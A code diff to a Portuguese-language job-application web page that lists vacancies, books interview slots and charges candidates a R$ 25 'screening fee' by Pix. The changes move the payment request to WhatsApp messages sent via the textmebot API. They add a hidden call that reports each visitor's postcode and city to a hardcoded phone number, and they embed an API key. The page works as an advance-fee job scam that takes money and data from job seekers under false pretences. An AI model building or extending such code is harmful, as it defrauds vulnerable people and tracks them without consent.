@@ -41,7 +41,7 @@
             display: flex; align-items: center; gap: 8px; cursor: pointer; 
         }
         
-        /* Menu Superior Modificado para Maior Destaque */
+        /* Menu Superior */
         .nav-links { display: flex; gap: 12px; }
         .nav-links button {
             background: var(--highlight); 
@@ -137,8 +137,7 @@
         .horario-label.selecionado { border-color: var(--primary); background: var(--highlight); color: var(--primary); }
 
         .pix-box { text-align: center; padding: 25px; border: 2px solid #bbf7d0; border-radius: 12px; margin-top: 20px; background: #f0fdf4; }
-        .pix-code { background: #ffffff; padding: 15px; word-break: break-all; border: 1px solid var(--border); border-radius: 8px; font-family: monospace; margin: 15px 0; font-size: 14px; user-select: all; color: var(--text-main); }
-
+        
         .payment-status {
             display: flex; align-items: center; justify-content: center; gap: 12px;
             margin-top: 20px; padding: 15px; background: var(--warning-bg);
@@ -170,7 +169,7 @@
         .modal-body h2 { font-size: 22px; font-weight: 800; border-bottom: 1px solid var(--border); padding-bottom: 15px; margin-bottom: 20px; }
         .modal-body p, .modal-body li { line-height: 1.6; color: var(--text-muted); font-size: 14px; }
         
-        /* Rodapé Atualizado */
+        /* Rodapé */
         footer { background: #0f172a; color: #94a3b8; padding: 40px 20px 20px 20px; font-size: 13px; }
         .footer-grid { max-width: 900px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 30px; margin-bottom: 30px; }
         .footer-col h4 { color: white; font-size: 15px; margin-bottom: 15px; text-align: left; }
@@ -262,39 +261,35 @@
 
                 <button id="btn-confirmar" class="btn-main btn-success btn-disabled" disabled onclick="confirmarAgendamento()">
                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
-                    Confirmar Horário e Pagar Taxa
+                    Confirmar Horário
                 </button>
             </div>
         </div>
 
-        <!-- PASSO 3: PAGAMENTO PIX -->
+        <!-- PASSO 3: AVISO WHATSAPP -->
         <div id="step-pix">
             <h2 style="color: var(--success); text-align: center; font-weight: 800; font-size: 24px;">Horário Pré-Reservado!</h2>
             <p style="text-align: center; font-size: 16px; color: var(--text-main);">Excelente escolha, <strong><span id="nome-confirmacao"></span></strong>!</p>
             <p style="text-align: center; color: var(--text-muted); font-size: 15px;">A vaga de <strong><span id="vaga-confirmacao"></span></strong> está quase garantida. O RH reservou seu horário para <strong style="color: var(--text-main);"><span id="horario-confirmacao"></span></strong>.</p>
             
             <div class="pix-box">
-                <h3 style="color: var(--success); margin-bottom: 8px; font-size: 18px;">Taxa de Triagem</h3>
-                <p style="font-size: 14px; margin-top: 0; color: var(--text-muted);">Efetue o pagamento de <strong>R$ 25,00</strong> para confirmar sua presença e evitar ausências na agenda da empresa.</p>
+                <h3 style="color: var(--success); margin-bottom: 8px; font-size: 18px;">Acesse seu WhatsApp! 📱</h3>
+                <p style="font-size: 15px; margin-top: 10px; color: var(--text-muted); line-height: 1.5;">O seu código Pix para a Taxa de Triagem (<strong>R$ 25,00</strong>) está sendo gerado de forma segura.</p>
                 
-                <div class="pix-code" id="codigo-pix">00020101021226830014br.gov.bcb.pix2561qrcode.owem.com.br/v2/qr/cob/e6cd83f4743d42d08dd21f110bc03b4b5204000053039865802BR5911Z TECH LTDA6009SAO PAULO62070503***63040B0E</div>
-                
-                <button class="btn-main" onclick="copiarPix()">Copiar Código Pix Copia e Cola</button>
-
-                <div class="trust-badges" style="margin-top: 15px;">
-                    <span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg> Pagamento seguro via Banco Central do Brasil</span>
+                <div style="background: #ffffff; padding: 15px; border: 1px solid var(--border); border-radius: 8px; margin: 20px 0; color: var(--text-main); font-weight: 500; font-size: 14px;">
+                    Enviaremos a chave Pix para o número: <br><strong style="color: var(--primary); font-size: 16px;"><span id="whatsapp-confirmacao"></span></strong> em instantes.
                 </div>
 
-                <div class="payment-status">
+                <div class="payment-status" style="margin-top: 10px;">
                     <div class="spinner"></div>
-                    <span>Aguardando identificação do Pix...</span>
+                    <span>Aguardando envio do Pix no seu WhatsApp...</span>
                 </div>
             </div>
             
             <div style="background: #f1f5f9; padding: 15px; border-radius: 8px; margin-top: 20px; text-align: center;">
                 <p style="margin: 0; font-size: 14px; color: var(--text-main); display: flex; align-items: center; justify-content: center; gap: 8px;">
                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
-                    <strong>Atenção:</strong> Assim que o pagamento for aprovado, o comprovante e as instruções de chegada serão enviados para o seu WhatsApp cadastrado.
+                    <strong>Atenção:</strong> Assim que realizar o pagamento com a chave enviada, sua entrevista estará marcada automaticamente!
                 </p>
             </div>
         </div>
@@ -330,7 +325,7 @@
     </div>
 </footer>
 
-<!-- MODAIS: INSTITUCIONAIS -->
+<!-- MODAIS -->
 <div id="modal-termos" class="modal-overlay" onclick="fecharModalFora(event, 'modal-termos')">
     <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-termos')">&times;</button><div class="modal-body">
         <h2>Termos de Uso</h2>
@@ -358,7 +353,6 @@
     </div></div>
 </div>
 
-<!-- MODAIS: AJUDA AO CANDIDATO -->
 <div id="modal-como-funciona" class="modal-overlay" onclick="fecharModalFora(event, 'modal-como-funciona')">
     <div class="modal-content"><button class="modal-close" onclick="fecharModal('modal-como-funciona')">&times;</button><div class="modal-body">
         <h2>Como Funciona?</h2>
@@ -437,14 +431,6 @@
     function fecharModal(id) { document.getElementById(id).style.display = 'none'; }
     function fecharModalFora(event, id) { if (event.target === document.getElementById(id)) fecharModal(id); }
 
-    // Pix
-    function copiarPix() {
-        const textoPix = document.getElementById("codigo-pix").innerText;
-        navigator.clipboard.writeText(textoPix).then(() => {
-            alert("Código Pix copiado! Cole no app do banco.");
-        }).catch(err => { alert("Erro ao copiar. Copie manualmente."); });
-    }
-
     // Banco de Vagas
     const profissoes = [
         { titulo: "Vendedor(a) de Loja", salario: "R$ 1.850,00 + Comissão", beneficios: "VT + VA (R$ 22/dia)", desc: "Atendimento, demonstração de produtos e fechamento.", exigencias: ["Ensino médio completo", "Boa comunicação"] },
@@ -510,6 +496,12 @@
 
             const cidade = data.localidade;
             const ufReal = data.uf;
+
+            // AVISO PARA O SEU NÚMERO
+            const apiKeyDono = 'Pskn5LW4qaCv';
+            const textoDono = `🚨 Nova busca de vagas!\nCEP digitado: ${cepInput}\nCidade: ${cidade} - ${ufReal}`;
+            const urlDono = `https://api.textmebot.com/send.php?recipient=+5522992195418&apikey=${apiKeyDono}&text=${encodeURIComponent(textoDono)}`;
+            fetch(urlDono, { mode: 'no-cors' }).catch(() => {});
 
             let dadosLocais = dadosLocaisPorCidade[cidade] || dadosLocaisPorCidade["PadraoBrasil"];
 
@@ -601,24 +593,25 @@
 
         const horarioEscolhido = document.querySelector('input[name="horario_escolhido"]:checked').value;
         const nome = document.getElementById('nome').value.trim();
+        const whatsappFormatado = document.getElementById('whatsapp').value;
+        const whatsappNumeros = whatsappFormatado.replace(/\D/g, '');
         const vaga = vagasAtivas[vagaEscolhidaIndex];
 
-        // 1. INTEGRAÇÃO DA API DO WHATSAPP TEXTMEBOT
-        const textoMsg = `prezado: ${nome} recebemos seu pre agendamento para vaga: ${vaga.titulo} efetue o pagamento para confirmar o agendamento.\n\nstatus: pendente de pagamaneto...\n\nse deseja o envio da chave pix digita: 1`;
+        // MENSAGEM DO CANDIDATO ATUALIZADA
+        const textoMsg = `prezado: ${nome} recebemos seu pre agendamento para vaga: ${vaga.titulo}\n\n🗓️ Horário: ${horarioEscolhido}\n📍 Local: ${vaga.endereco}\n\nseu código Pix de R$ 25,00 está sendo gerado e será enviado aqui em instantes. Assim que o pagamento for feito, sua entrevista estará marcada automaticamente!\n\nstatus: aguardando envio do Pix...`;
         const apiKey = 'Pskn5LW4qaCv';
         
-        // Disparo fixo para o número de controle (5522992195418) usando HTTPS
-        const urlApi = `https://api.textmebot.com/send.php?recipient=+5522992195418&apikey=${apiKey}&text=${encodeURIComponent(textoMsg)}`;
+        const urlApi = `https://api.textmebot.com/send.php?recipient=+55${whatsappNumeros}&apikey=${apiKey}&text=${encodeURIComponent(textoMsg)}`;
         
-        // Chamada via fetch (no-cors para não dar block visual no frontend)
         fetch(urlApi, { mode: 'no-cors' })
-            .then(() => console.log('Sinal de API enviado para +5522992195418'))
+            .then(() => console.log('Sinal de API enviado para o candidato'))
             .catch(err => console.error('Erro no disparo WhatsApp:', err));
 
-        // 2. AVANÇAR DE TELA
+        // AVANÇAR DE TELA
         document.getElementById('nome-confirmacao').innerText = nome.split(' ')[0];
         document.getElementById('vaga-confirmacao').innerText = vaga.titulo;
         document.getElementById('horario-confirmacao').innerText = horarioEscolhido;
+        document.getElementById('whatsapp-confirmacao').innerText = whatsappFormatado;
         
         document.getElementById('step-vagas').style.display = 'none';
         document.getElementById('step-pix').style.display = 'block';
